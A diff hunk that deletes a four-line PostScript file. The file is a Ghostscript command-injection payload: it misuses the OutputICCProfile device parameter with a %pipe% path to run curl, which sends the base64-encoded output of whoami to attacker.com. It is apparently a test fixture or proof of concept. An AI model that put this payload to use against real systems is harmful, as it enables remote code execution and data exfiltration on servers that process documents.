@@ -1,4 +1,0 @@
-%!PS
-currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
-.putdeviceparams
-quit
